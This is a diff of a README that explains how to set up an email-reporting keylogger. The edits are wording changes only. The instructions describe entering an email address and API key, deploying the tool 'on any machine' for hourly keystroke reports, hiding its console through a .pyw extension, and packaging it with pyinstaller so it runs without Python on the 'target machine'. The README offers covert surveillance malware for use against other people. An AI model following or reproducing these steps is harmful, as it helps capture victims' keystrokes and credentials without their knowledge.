@@ -1,12 +1,12 @@
 # Instructions
-These are **step by step** instructions on how to use this
+These are **step by step** instructions on how to use these
 ## Key Logger Email
-To use this you will have to go into the file and set your **Email** and **API Key** on lines 7 and 8 <br />
+To use the Key Logger you will have to go into the file and set your **Email** and **API Key** on lines 7 and 8 <br />
 ```
 EMAIL = "YOUR_EMAIL"
 API_KEY = "YOUR_API_KEY"
 ```
-Once set just deploy it on any machine and every single hour you will get a new report! <br />
+Once set up deploy it on any machine then every single hour you will get a new report! <br />
 ### Recommendations
 1. You should rename the file extension from **.py** to **.pyw**
 2. Run it through **pyinstaller** to make it an exe so you **don't need python installed in the target machine**
